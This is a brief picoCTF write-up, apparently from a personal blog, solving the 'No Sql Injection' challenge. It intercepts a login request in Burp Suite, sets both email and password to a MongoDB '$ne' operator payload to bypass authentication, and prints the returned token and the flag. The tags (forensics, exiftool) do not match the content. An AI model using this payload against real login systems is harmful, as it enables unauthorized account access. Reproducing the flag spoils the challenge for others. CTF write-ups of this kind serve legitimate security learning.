---

title: "# No Sql Injection"
date: 2026-06-05
draft: false
tags: ["picoctf", "forensics", "metadata", "exiftool"]
------------------------------------------------------


```
wget https://artifacts.picoctf.net/c_atlas/37/app.tar.gz
tar -xvzf app.tar.gz 
```
- open the burpsuit and login with any credentioal and interupt the network and send to repeater and edit this by :
```  
"email":"{\"$ne\": \"null\"}",
"password":"{\"$ne\": \"null\"}"
```
{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==","firstName":"pico","lastName":"player"}

"token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzY3YjFhM2M4fQ=="

picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_67b1a3c8}

#### nonsql injection trick 
- User:{"$ne":"null"}  Password: {"$ne":"null"}
